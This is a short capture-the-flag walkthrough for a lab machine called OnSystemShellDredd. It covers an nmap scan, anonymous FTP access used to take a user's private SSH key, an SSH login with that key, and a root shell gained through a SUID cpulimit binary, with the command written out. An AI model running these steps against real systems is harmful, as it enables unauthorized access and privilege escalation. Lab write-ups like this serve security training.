# OnSystemShellDredd

## Nmap

```
sudo nmap 192.168.172.130 -p- -sS -sV

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP on the host is open to anonymous login. When logged in use `ls -la` to view hidden files. Upon moving into the .hannah directory ensure **binary** mode is enabled then grab the id\_rsa.

![](<../../../.gitbook/assets/image (1158).png>)

Ensure to change the permissions on the id\_rsa to make it usable.

```
chmod 600 id_rsa
```

Then proceed to login as the user hannah specifying port 61000.

```
ssh -p 61000 -i id_rsa hannah@192.168.172.130
```

![](<../../../.gitbook/assets/image (1159).png>)

Running linpeas on the target machine after transferring over finds the binary cpulimit has a SUID bit set.

![](<../../../.gitbook/assets/image (1160).png>)

Checking GTFOBins against this binary reports the following:

![](<../../../.gitbook/assets/image (1161).png>)

We can then use the following command to gain a root shell:

```
/usr/bin/cpulimit -l 100 -f -- /bin/sh -p
```

![](<../../../.gitbook/assets/image (1165).png>)
